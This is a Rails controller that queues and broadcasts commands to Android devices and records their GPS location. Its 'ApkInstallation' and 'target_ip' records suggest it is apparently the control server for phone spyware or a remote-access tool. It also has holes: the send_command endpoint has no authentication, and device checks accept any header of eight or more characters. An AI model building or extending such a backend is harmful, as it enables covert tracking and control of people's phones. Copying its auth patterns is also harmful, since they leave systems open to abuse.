# API Controller for REST-based command polling (fallback for WebSocket)
class Api::CommandsController < ApplicationController
  skip_before_action :verify_authenticity_token
  before_action :authenticate_device, except: [:send_command]

  # GET /api/commands/:device_id
  # Android device polls for pending commands
  def show
    device_id = params[:id]
    commands = fetch_pending_commands(device_id)
    
    render json: { commands: commands }
  end

  # POST /api/commands/:device_id/ack
  # Device acknowledges command execution
  def ack
    device_id = params[:id]
    command_id = params[:command_id]
    
    mark_command_executed(device_id, command_id)
    
    render json: { status: 'ok' }
  end

  # POST /api/commands/:device_id/send
  # Admin sends command to device via WebSocket broadcast
  def send_command
    device_id = params[:id]
    command = params[:command]
    command_params = params[:params] || {}

    ActionCable.server.broadcast(
      "commands_#{device_id}",
      { type: 'command', action: command, params: command_params }
    )

    Rails.logger.info "[API::CommandsController] Command '#{command}' sent to #{device_id}"
    render json: { status: 'ok', command: command, device_id: device_id }
  end

  # POST /api/location
  # Device submits location update via REST
  def location
    device_id = request.headers['X-Device-Id']
    
    smartphone = find_smartphone(device_id)
    return render json: { error: 'Device not found' }, status: 404 unless smartphone

    GeoLocation.create!(
      smartphone: smartphone,
      latitude: params[:latitude],
      longitude: params[:longitude],
      accuracy: params[:accuracy],
      altitude: params[:altitude],
      speed: params[:speed],
      captured_at: Time.current
    )

    render json: { status: 'ok' }
  end

  private

  def authenticate_device
    device_id = request.headers['X-Device-Id']
    unless device_id.present? && device_id.length >= 8
      render json: { error: 'Invalid device' }, status: 401
    end
  end

  def fetch_pending_commands(device_id)
    redis = Redis.new(url: ENV['REDIS_URL'] || 'redis://localhost:6379/1')
    commands = redis.lrange("commands:#{device_id}:pending", 0, -1)
    redis.close
    
    commands.map { |c| JSON.parse(c) }
  rescue => e
    Rails.logger.warn "[API::CommandsController] Redis error: #{e.message}"
    []
  end

  def mark_command_executed(device_id, command_id)
    redis = Redis.new(url: ENV['REDIS_URL'] || 'redis://localhost:6379/1')
    redis.sadd("commands:#{device_id}:executed", command_id)
    redis.close
  rescue => e
    Rails.logger.warn "[API::CommandsController] Redis error: #{e.message}"
  end

  def find_smartphone(device_id)
    installation = ApkInstallation.find_by(target_ip: device_id)
    installation&.smartphone
  end
end
